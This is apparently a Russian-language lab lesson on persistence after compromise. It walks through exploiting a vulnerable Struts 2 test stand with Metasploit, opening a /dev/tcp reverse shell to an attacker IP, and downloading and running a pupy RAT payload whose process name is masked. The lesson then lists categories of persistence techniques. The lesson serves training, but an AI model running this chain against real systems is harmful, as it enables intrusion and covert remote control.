### Основные понятия

**Закрепление доступа** — это набор методов, которые атакующие используют для сохранения доступа к системам после
перезагрузки, изменения учетных данных и других изменений, которые могли бы прервать их доступ.

**Backdoor (англ. Тайная дверь)** — Backdoor - это скрытый способ доступа к системе, приложению или устройству, который
обычно используется для обхода стандартных механизмов аутентификации и безопасности.

**MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge)**  это модель для описания тактик, техник и
процедур,
которые могут использоваться киберпреступниками для осуществления кибератак на организации и компании. Модель MITRE
ATT&CK описывает более 200 тактик и приемов, которые могут использоваться киберпреступниками на разных этапах
кибератаки - от получения доступа к сети до уничтожения данных и скрытия следов своей деятельности.

### Разбор базового примера

Закрепление доступа в скомпрометированных системах
Рассмотрим закрепление доступа в скомпрометированной системе с помощью средства удаленного администрирования pupy.

Ход действий

1. У нас есть уязвимый стенд со Struts 2 и подготовленный фреймворк pupy, находящийся в контейнере.

2. Проэксплуатируем уязвимость с помощью msf:

   $ msfconsole

   msf6> use exploit/multi/http/struts2_code_exec_showcase

   msf6> set RHOSTS evil.corp

   msf6> set TARGETURI /integration/saveGangster.action

   msf6> set PAYLOAD cmd/unix/generic

   msf6> set CMD id

   msf6> exploit

3. Обеспечим себе доступ с помощью создания обратного соединения:

Воспользуемся ресурсом revshells.com для генерирования команд, откроем listener
Откроем новое окно терминала и запустим утилиту netcat для принятия соединения с удаленной машины:

    $ nc -lvp 9004  

Запустим команду, инициирующую подключение к netcat из атакуемой машины:

    msf6> set CMD 'sh -I >& /dev/tcp/172.20.10.7/9004 0>&1'

Теперь, когда соединение установлено, можно начать подготовку к запуску клиентской части pupy для более удобного
управления скомпрометированной машиной.

4. Для работы с pupy необходимо добавить свой SSH-ключ в доверенные:

Учтите, что ~ это домашняя директория, т.е. нужно сгенерировать ключ. Чтобы сделать это воспользуйтесь утилитой
ssh-keygen и создайте стандартный незащищенный паролем ключ нажав enter несколько раз.

    $ cp ~/.ssh/id_rsa.pub /tmp/projects/keys/authorized_keys

Подключимся к интерфейсу сервера pupy:

    $ ssh -I ~/.ssh/id_rsa -p 2022 pupy@127.0.0.1

5. Для генерации payload воспользуемся командой gen:

Справка:

    > > gen -h

6. Создаем нагрузку под ОС Linux с архитектурой x64:

   > > gen -f client -O linux -A x64 connect

Бинарный файл появляется в директории /projects/default/output, затем необходимо передать его на скомпрометированный
узел с помощью веб-сервера, встроенного в python.

7. Переходим в директорию с файлом:

   $ cd /tmp/projects/default/output

8. Запускаем сервер:

   $ python3 -m http.server 3000

9. Определим наш ip-адрес:

   $ ip -a

10. На скомпрометированном узле выполняем команду:

> wget http://172.20.10.7:3000/pupyx64.Nla2MY.lin # IP-адрес и название файла нужно определить по выводу предыдущих
> команд

11. Дадим файлу права на исполнение:

> chmod +x pupy* # * заменяется на все файлы, начинающиеся с pupy

12. Выполним файл и подождем его подключения серверу RAT:

> ./pupy*

13. После успешного подключения соберем информацию о хосте:

> > info

14. Посмотрим, как процесс RAT выглядит в системе:

> ps aux

Имя процесса маскируется, что обеспечивает скрытность при управлении удаленным компьютером.

### Общие принципы

Доступ к скомпрометированной системе можно потерять по следующим причинам:

- Перебои в работе сети
- Нестабильный код нагрузки
- Вмешательство команды реагирования на инцидент или администратора
- Перезагрузка системы и пр.


**ВАЖНО**: потерять доступ к скомпрометированной системе может быть критически недопустимо, т.к. впоследствии доступа можно
уже не получить.

В том числе, поэтому важно отразить, что данный этап может быть исполнен сразу после успешного проведения первичных
атак.

#### Категории методов закрепления доступа

Процесс закрепления доступа насчитывает сотни приемов, предоставляющих доступ к системе различными каналами, мы
рассмотрим некоторые из них, но все примеры можно разбить на категории по степени “инвазивности”:

#### Менее инвазивные:

- Получение легитимного доступа к системе (получение информации об легитимных учетных данных, ключах доступа, правилах
доступа)

- Внесение изменений в легитимные механизмы доступа (добавление учетных записей, изменение паролей учетных записей,
внесение собственных ключей доступа, добавление устройств и пр.)

#### Более инвазивные:

- Внесение изменений в сервисы и внешние программы в ОС (получение доступа через веб-сервисы, файловые серверы, VPN сервер
и пр.)

- Внесение изменений в ядро ОС и предустановленные службы работающие на уровне ядра (внесение изменений: в автозагрузчик,
модули аутентикации, в системные процессы, в загрузчик ядра, в ядро ОС, в скрипты инициализации, в обработчики событий \
прерываний и пр.)